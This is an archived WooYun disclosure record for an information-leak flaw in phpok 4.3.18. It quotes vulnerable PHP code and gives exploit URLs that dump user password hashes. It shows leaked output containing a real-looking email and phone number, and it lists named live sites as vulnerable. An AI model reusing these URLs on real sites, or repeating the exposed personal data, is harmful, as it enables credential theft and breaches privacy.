{"id": 69471, "wybug_id": "wooyun-2015-0127843", "wybug_title": "phpok4.3.18 存高危设计缺陷(demo测试)。", "wybug_corp": "phpok.com", "wybug_author": "′雨。", "wybug_date": "2015-07-20 14:53", "wybug_open_date": "2015-10-18 15:36", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-18：\t细节向公众公开  简要描述： RT 详细说明：  可直接拿管理员密码。在framework/inp_control.php 中\nfunction index_f()\t{\t \t\t$type = $this->get(\"type\");\t\t\t$content = $this->get(\"content\");\t\tif($type == \"title\" && $content)\t\t{\t\t\t$this->get_title_list($content);\t\t}\t\telseif($type == \"user\" && $content)\t\t{\t\t\t$this->get_user_list($content);//跟这里\t\t}\t\tjson_exit(\"ok\");\t}\n\nfunction get_user_list($content)\t{\t\t$content = explode(\",\",$content);//成数组\t\t$list = array();\t\tforeach($content AS $key=>$value)\t\t{\t\t\t$value = intval($value);//被转整 没办法注入了。\t\t\tif($value) $list[] = $value;\t\t}\t\t$list = array_unique($list);\t\t$content = implode(\",\",$list);\t\tif(!$content) json_exit(\"ok\");\t\t$condition = \"u.id IN(\".$content.\")\";//把转整后的带入\t\t$rslist = $this->model(\"user\")->get_list($condition,0,999);\t\tif($rslist)\t\t{\t\t\tjson_exit($rslist,true);\t\t}\t\tjson_exit(\"ok\");\t}\n虽然没办法注入 但是我们继续看\nif($rslist)//查询出来的数组\t\t{\t\t\tjson_exit($rslist,true);//数出来\t\t}\t\tjson_exit(\"ok\");\n把全部就输出来了。。 可啪。。包括密码 全部的。本地测试一下访问 http://web/new/phpok/index.php?id=inp&type=user&content=3 输出 {\"status\":\"ok\",\"content\":{\"\":{\"id\":null,\"group_id\":\"2\",\"user\":\"admin\",\"pass\":\"ea6db1173951383825637cb4eea24bcd:38\",\"status\":\"1\",\"regtime\":\"1389672572\",\"email\":\"ad@admin.com\",\"mobile\":\"158185xxxxx\",\"code\":\"\",\"avatar\":\"res\\/201402\\/08\\/488e6e17b9fb7f75.jpg\",\"fullname\":\"\",\"gender\":\"\",\"content\":false}}}demo测试一下http://demo.phpok.com/index.php?id=inp&type=user&content=17http://demo.phpok.com/index.php?id=inp&type=user&content=14http://demo.phpok.com/index.php?id=inp&type=user&content=15{\"status\":\"ok\",\"content\":{\"15\":{\"id\":\"15\",\"group_id\":\"2\",\"user\":\"ehu114\",\"pass\":\"0ba5a37e002bcb9f4469e5deb3ec317f:15\",\"status\":\"0\",\"regtime\":\"1424368658\",\"email\":\"8752316@qq.com\",\"mobile\":\"18961833060\",\"code\":\"\",\"avatar\":\"\",\"fullname\":\"\",\"gender\":\"\",\"content\":\"\"}}}都输出了密码 之类的官网上的成功案例。http://www.easyexe.cn/index.php?id=inp&type=user&content=2http://www.artpower.com.cn/index.php?id=inp&type=user&content=2http://angeljuicer.cn/index.php?id=inp&type=user&content=3http://www.sz-drh.com//index.php?id=inp&type=user&content=3http://www.udeesoft.com//index.php?id=inp&type=user&content=3   漏洞证明：  见上。   修复方案：  敏感信息别输出。   版权声明：转载请注明来源 ′雨。@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-07-20 15:35 厂商回复： 好吧，我才发现这个文件我几乎没有用到，都不记得当时写个接口是做啥子用的，没想到你还能利用起来！囧啊~~~ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-20 14:54 |    \t\t凌零0 \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:6        )\t\t \n  6    \n     2015-07-20 14:54 |    \t\tCheery \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 0.0)\t\t \n  前排    \n     2015-07-20 15:01 |    \t\tsin \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:2        | 寻找最优雅的解决方案)\t\t \n  又来...     \n     2015-07-20 15:03 |    \t\tmyhalo \t\t\t( 普通白帽子  |\t\t\t        Rank:281 漏洞数:55        | 所属团队:TSafe)\t\t \n  回来了？    \n     2015-07-20 15:26 |    \t\tHero \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:31        | 药药切克闹,充气娃娃迷幻药)\t\t \n  雨牛复活了    \n     2015-07-20 17:31 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  可shell?    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}